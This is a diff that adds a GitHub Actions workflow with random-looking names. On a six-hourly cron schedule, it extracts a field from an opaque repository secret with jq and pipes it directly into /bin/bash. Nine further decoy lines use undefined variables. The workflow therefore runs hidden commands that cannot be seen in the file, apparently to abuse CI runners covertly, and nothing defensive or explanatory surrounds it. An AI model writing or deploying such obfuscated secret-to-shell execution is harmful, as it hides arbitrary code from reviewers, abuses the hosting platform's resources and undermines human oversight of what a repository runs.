@@ -1,0 +1,26 @@
+name: lilangzx
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lilangzx
+        env:
+          ka94: ${{ secrets.ka94 }}
+        run: |
+          echo $ka94 | jq -r .qyuv44464 | /bin/bash
+          echo $ightk06141 | jq -r .i4 | /bin/bash
+          echo $adwkd5816 | jq -r .p3567 | /bin/bash
+          echo $b553 | jq -r .ovubj9428 | /bin/bash
+          echo $iz2 | jq -r .xxka9 | /bin/bash
+          echo $eana52614 | jq -r .tcok02 | /bin/bash
+          echo $dp15055 | jq -r .ee6107 | /bin/bash
+          echo $fb45204 | jq -r .bfvuq99 | /bin/bash
+          echo $g96 | jq -r .n00108 | /bin/bash
+          echo $mjf3945 | jq -r .zmwpt13916 | /bin/bash
+
